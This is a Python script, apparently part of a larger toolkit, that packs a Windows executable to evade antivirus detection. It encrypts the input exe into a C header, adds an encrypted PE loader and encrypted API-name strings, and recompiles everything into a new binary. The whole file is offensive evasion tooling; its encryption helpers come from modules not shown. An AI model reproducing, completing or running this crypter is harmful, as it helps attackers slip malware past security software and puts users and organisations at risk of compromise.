import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir)))
from NeedData import *
from NeedFunc import *
from NeedEncry import *

def is_exe_file(file_path):
    with open(file_path, 'rb') as f:
        return f.read(2) == b'MZ'


def ExeBypass(in_exe_path:str,SourceCodeDirectoryPath:str,OutExeDirectoryPath:str):
    """
    function: evasive an exe file
    parameter specification:
        in_exe_path: str, the path of input exe file
        SourceCodeDirectoryPath: str, the path of SourceCodeDirectory
        OutExeDirectoryPath: str, the path of output exe file
    return specification:
        out_exe_path: str, the path of output exe file
    """

    data_encrypt_hFile_path = os.path.join(SourceCodeDirectoryPath,"data_encrypt.h")
    # 1. Encrypt the exe file and write it to the header file
    write_exe_to_head_file(in_exe_path,data_encrypt_hFile_path)

    # 2. Write the PELoader to the header file
    PELoader_HfilePath = os.path.join(SourceCodeDirectoryPath,"PELoader.h")
    # 1:encrypted, 0:not encrypted
    PELoader_enc_flag = 1
    write_PELoader_to_head_file(PELoader_HfilePath,PELoader_enc_flag)

    
    # 3. Write the sensitive string to the header file
    basicFuncName_Hfile_Path = os.path.join(SourceCodeDirectoryPath,"basicFuncName_encrypt.h")
    write_sensitive_string_to_head_file(basicFuncName_Hfile_Path)
    # 4. Compile the source code
    try:
        out_exe_path = second_compilate(in_exe_path,SourceCodeDirectoryPath,OutExeDirectoryPath)
    except Exception as e:
        print(f'second_compilate error:{e}')
        return None

    return out_exe_path

if __name__ == "__main__":
    if len(sys.argv) == 1:
        in_exe_path = "\\path\\to\\in\\exe"
        SourceCodeDirectoryPath = "path\\to\\SourceCodeFile"
        OutExeDirectoryPath = "path\\to\\OutExeFile"
    elif len(sys.argv) == 4:
        in_exe_path = sys.argv[1]
        SourceCodeDirectoryPath = sys.argv[2]
        OutExeDirectoryPath = sys.argv[3]
    else:
        print("Usage: python ExeBypass.py in_exe_path SourceCodeDirectoryPath OutExeDirectoryPath")
        exit(-1)

    if is_exe_file(in_exe_path) :
        out_exe_path = ExeBypass(in_exe_path,SourceCodeDirectoryPath,OutExeDirectoryPath)
    else:
        print(f'{in_exe_path} is not a valid exe file')

    print(f'out_exe_path:{out_exe_path}')